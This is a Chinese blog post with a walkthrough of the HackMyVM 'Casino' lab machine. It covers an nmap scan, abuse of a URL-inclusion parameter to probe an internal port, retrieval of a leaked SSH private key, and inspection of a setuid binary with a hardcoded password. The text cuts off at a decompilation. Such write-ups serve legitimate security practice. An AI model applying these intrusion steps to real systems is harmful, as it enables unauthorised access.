<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HackMyVM-Casino | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="难度:Medium kali:192.168.56.104 靶机:192.168.56.169  五一放假，家里一堆事，也是一个靶机没打，放假前下的好几个靶机也是甩屁股后面了，今天开学第一天，打个靶机康复一下。边打边记录。  端口扫描┌──(root㉿kali2)-[~&#x2F;Desktop] └─# nmap 192.168.56.169 -sV -A -p- Starting Nmap 7.94SV">
<meta property="og:type" content="article">
<meta property="og:title" content="HackMyVM-Casino">
<meta property="og:url" content="https://tao0845.github.io/posts/16d10af0/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="难度:Medium kali:192.168.56.104 靶机:192.168.56.169  五一放假，家里一堆事，也是一个靶机没打，放假前下的好几个靶机也是甩屁股后面了，今天开学第一天，打个靶机康复一下。边打边记录。  端口扫描┌──(root㉿kali2)-[~&#x2F;Desktop] └─# nmap 192.168.56.169 -sV -A -p- Starting Nmap 7.94SV">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/OpIsDU.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/OpIV6Y.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/OpI9Yc.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/OpIlpq.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/OpI8SG.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/OpIXw1.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/OpIInI.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/OpI3DD.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/OpIC8F.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/Op3Mk6.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/Op3W1K.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/Op3bHa.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/Op3k8S.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/Op3zxN.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/05/06/Op3FpC.png">
<meta property="article:published_time" content="2024-05-06T12:54:10.142Z">
<meta property="article:modified_time" content="2024-06-07T05:26:52.612Z">
<meta property="article:author" content="ta0">
<meta property="article:tag" content="Z3">
<meta property="article:tag" content="open">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/05/06/OpIsDU.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">94</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">147</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">web信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">3.</span> <span class="toc-text">getshell</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/16d10af0/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HackMyVM-Casino</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-05-06 20:54:10" itemprop="dateCreated datePublished" datetime="2024-05-06T20:54:10+08:00">2024-05-06</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-06-07 13:26:52" itemprop="dateModified" datetime="2024-06-07T13:26:52+08:00">2024-06-07</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">2.8k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">15m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/HackMyVM/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">HackMyVM</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Z3/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Z3</span></a><a class="tag-item" href="/tags/open/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">open</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:Medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.169</strong></p>
<blockquote>
<p>五一放假，家里一堆事，也是一个靶机没打，放假前下的好几个靶机也是甩屁股后面了，今天开学第一天，打个靶机康复一下。边打边记录。</p>
</blockquote>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.169 -sV -A -p-</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-05-06 <span class="token number">20</span>:56 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.169
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00086s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">9</span>.2p1 Debian <span class="token number">2</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> 3b:20:d0:ba:e2:7a:8a:01:8a:35:3b:52:08:b0:c6:a8 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">74</span>:76:0a:61:d4:2c:9b:45:36:00:4d:c8:d8:be:0b:89 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.57 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
<span class="token operator">|</span>_http-title: Binary Bet Casino
<span class="token operator">|</span>_http-server-header: Apache/2.4.57 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
MAC Address: 08:00:27:E3:4E:FC <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.86</span> ms <span class="token number">192.168</span>.56.169

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">10.73</span> seconds</code></pre>
<p>开启了22 80两个端口 80端apache服务，直接去web看吧。</p>
<h2 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h2><p><img src="https://ooo.0x0.ooo/2024/05/06/OpIsDU.png" alt="OpIsDU.png" loading="lazy"><br>是一个简单的登录界面，界面没有太多功能点，一个登录一个注册。<br>先去注册一手，当然注册的时候要用抓包看<br><img src="https://ooo.0x0.ooo/2024/05/06/OpIV6Y.png" alt="OpIV6Y.png" loading="lazy"><br>没什么有用的信息，但是看这个界面我又想到admin这个账号，用admin注册发现用户已存在，那就先尝试爆破一下admin的密码<br><img src="https://ooo.0x0.ooo/2024/05/06/OpI9Yc.png" alt="OpI9Yc.png" loading="lazy"><br>爆了一下没什么结果，大概率没有弱口令，sql注入也试了一下没有什么结果，这里就不贴图了，直接登录。<br><img src="https://ooo.0x0.ooo/2024/05/06/OpIlpq.png" alt="OpIlpq.png" loading="lazy"><br>登录上去好像是一些小游戏</p>
<blockquote>
<hr>
<p>WIN 10.000$ &#x3D;&gt; WIN A TEDDY BEAR</p>
<hr>
<p>Intructions</p>
<ul>
<li>CUPS<br>The player tries to guess which of three cups hides a small ball. The cups are shuffled, and the player must select the correct one to win. The player wins or losess the same amount he bets.</li>
<li>GUN<br>The player presses the “Shoot” button. There is a 1&#x2F;6 chance of losing. In that case, the player’s money is multiplied by 0.15. Otherwise, the player’s money is multiplied by 1.5.</li>
<li>Dice<br>The player places a bet on whether the value of the sum of two dice will be less than, equal to or greater than 7.<br>||&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;||<br>||&#x2F;&#x2F;$\&#x2F;/////////////////////////////&#x2F;$\||<br>||(100)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;| FEDERAL RESERVE NOTE |&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(100)||<br>||\$&#x2F;&#x2F;        ~         ‘——&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;——–’                \$&#x2F;&#x2F;||<br>||&lt;&lt; &#x2F;        &#x2F;$\              &#x2F;&#x2F; ____ \                         \ &gt;&gt;||<br>||&gt;&gt;|  12    &#x2F;&#x2F;L\            &#x2F;&#x2F; &#x2F;&#x2F;&#x2F;..) \         L38036133B   12 |&lt;&lt;||<br>||&lt;&lt;|        \ &#x2F;&#x2F;           || &lt;||  &gt;\  ||                        |&gt;&gt;||<br>||&gt;&gt;|         $&#x2F;            ||  $$ –&#x2F;  ||        One Hundred     |&lt;&lt;||<br>||&lt;&lt;|      L38036133B        *\  |_&#x2F;  &#x2F;&#x2F;* series                 |&gt;&gt;||<br>||&gt;&gt;|  12                     <em>\&#x2F;____&#x2F;&#x2F;</em>   1989                  |&lt;&lt;||<br>||&lt;&lt;\      Treasurer     ______&#x2F;Franklin________     Secretary 12 &#x2F;&gt;&gt;||<br>||&#x2F;&#x2F;$\                 <del>|UNITED STATES OF AMERICA|</del>               &#x2F;$\||<br>||(100)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  ONE HUNDRED DOLLARS &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(100)||<br>||\$&#x2F;&#x2F;/////////////////////////////\$&#x2F;&#x2F;||<br>||&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;||</li>
</ul>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/05/06/OpI8SG.png" alt="OpI8SG.png" loading="lazy"><br>就玩小游戏呗，也不知道要多少钱才有东西<br><img src="https://ooo.0x0.ooo/2024/05/06/OpIXw1.png" alt="OpIXw1.png" loading="lazy"><br>玩杯子梭哈赚到10000以上也没给东西<br><img src="https://ooo.0x0.ooo/2024/05/06/OpIInI.png" alt="OpIInI.png" loading="lazy"><br>在一次梭哈失败中，给了一个特殊的url<br><code>http://192.168.56.169/casino/explainmepls.php?learnabout=en.wikipedia.org/wiki/Shell_game</code><br>尝试LFI<br><img src="https://ooo.0x0.ooo/2024/05/06/OpI3DD.png" alt="OpI3DD.png" loading="lazy"><br>成功包含，但是除了这个界面其他文件都包含失败，在我一番苦思冥想之后， 突发奇想，想尝试一下fuzz一下内部开启的端口<br><img src="https://ooo.0x0.ooo/2024/05/06/OpIC8F.png" alt="OpIC8F.png" loading="lazy"><br>除了80外之后还有一个6969端口<br><img src="https://ooo.0x0.ooo/2024/05/06/Op3Mk6.png" alt="Op3Mk6.png" loading="lazy"><br>给了一个todo清单不过也没什么用，尝试从6969端口进行目录扫描<br>懒得有ffuf了，直接用bp爆吧<br><img src="https://ooo.0x0.ooo/2024/05/06/Op3W1K.png" alt="Op3W1K.png" loading="lazy"><br>爆出一个目录<code>codebreakers</code><br><img src="https://ooo.0x0.ooo/2024/05/06/Op3bHa.png" alt="Op3bHa.png" loading="lazy"><br>源码泄露了一个地址<code>shimmer_rsa</code><br><img src="https://ooo.0x0.ooo/2024/05/06/Op3k8S.png" alt="Op3k8S.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/05/06/Op3zxN.png" alt="Op3zxN.png" loading="lazy"><br>也是拿到了私钥</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>用shimmer用户登录ssh</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh -i a.txt shimmer@192.168.56.169</span>
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.56.169 (192.168.56.169)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:3hguhY7J5te4KPihLZxYjfxLj8pyQOa7qtu0XjMl3DY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">192.168</span>.56.169' <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span> to the list of known hosts.
Debian GNU/Linux <span class="token number">12</span>
Welcome to Binary Bet Casino
--------------------------------
Linux casino <span class="token number">6.1</span>.0-9-amd64 <span class="token comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun <span class="token number">14</span> <span class="token number">17</span>:24:28 <span class="token number">2023</span> from <span class="token number">192.168</span>.1.71
shimmer@casino:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">shimmer@casino:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">48</span>
drwx------ <span class="token number">3</span> shimmer shimmer  <span class="token number">4096</span> jun <span class="token number">14</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">4</span> root    root     <span class="token number">4096</span> jun <span class="token number">14</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> shimmer shimmer     <span class="token number">9</span> jun <span class="token number">14</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> shimmer shimmer   <span class="token number">220</span> jun <span class="token number">14</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> shimmer shimmer  <span class="token number">3526</span> jun <span class="token number">14</span>  <span class="token number">2023</span> .bashrc
-rwsr-xr-x <span class="token number">1</span> root    root    <span class="token number">16432</span> jun <span class="token number">14</span>  <span class="token number">2023</span> pass
-rw-r--r-- <span class="token number">1</span> shimmer shimmer   <span class="token number">807</span> jun <span class="token number">14</span>  <span class="token number">2023</span> .profile
drwx------ <span class="token number">2</span> shimmer shimmer  <span class="token number">4096</span> jun <span class="token number">14</span>  <span class="token number">2023</span> .ssh
-rw-r--r-- <span class="token number">1</span> root    root       <span class="token number">17</span> jun <span class="token number">14</span>  <span class="token number">2023</span> user.txt</code></pre>
<p>shimmer目录下有user flag还有一个鲜艳的红色pass 所属root</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">shimmer@casino:~$ <span class="token function">file</span> pass
pass: setuid ELF <span class="token number">64</span>-bit LSB pie executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>69534d98e628cad52c35ba899c71650dc0e48bdf, <span class="token keyword">for</span> GNU/Linux <span class="token number">3.2</span>.0, not stripped</code></pre>
<p>是一个x86可执行文件<br>看看有没有泄露密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">shimmer@casino:~$ strings pass
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
setuid
strlen
execvp
<span class="token function">open</span>
__libc_start_main
__cxa_finalize
<span class="token builtin class-name">printf</span>
getuid
strcmp
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Correct pass
Incorrect pass
Passwd: 
/opt/root.pass
Second Passwd: 
ultrasecretpassword
/bin/sh
bye.
<span class="token punctuation">;</span>*3$"
GCC: <span class="token punctuation">(</span>Debian <span class="token number">12.2</span>.0-14<span class="token punctuation">)</span> <span class="token number">12.2</span>.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
pass.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
stdin@GLIBC_2.2.5
_edata
_fini
strlen@GLIBC_2.2.5
getuid@GLIBC_2.2.5
printf@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
strcmp@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
open@GLIBC_2.2.5
execvp@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
checkPasswd
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment</code></pre>
<p>没泄露 可惜，不过可以看出是读取&#x2F;opt下面的root.pass</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">shimmer@casino:/opt$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">16</span>
drwxr-xr-x  <span class="token number">3</span> root     root     <span class="token number">4096</span> jun <span class="token number">14</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root     root     <span class="token number">4096</span> jun <span class="token number">13</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-------  <span class="token number">1</span> root     root       <span class="token number">15</span> jun <span class="token number">14</span>  <span class="token number">2023</span> root.pass
drwxr-xr-x  <span class="token number">4</span> www-data www-data <span class="token number">4096</span> jun <span class="token number">14</span>  <span class="token number">2023</span> todo-list
-rw-r--r--  <span class="token number">1</span> root     root        <span class="token number">0</span> jun <span class="token number">14</span>  <span class="token number">2023</span> user.pass
shimmer@casino:/opt$ <span class="token function">cat</span> user.pass 
shimmer@casino:/opt$ <span class="token function">cat</span> root.pass 
cat: root.pass: Permiso denegado</code></pre>
<p>无权查看，只好丢尽ida分析了<br><img src="https://ooo.0x0.ooo/2024/05/06/Op3FpC.png" alt="Op3FpC.png" loading="lazy"></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __uid_t v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>
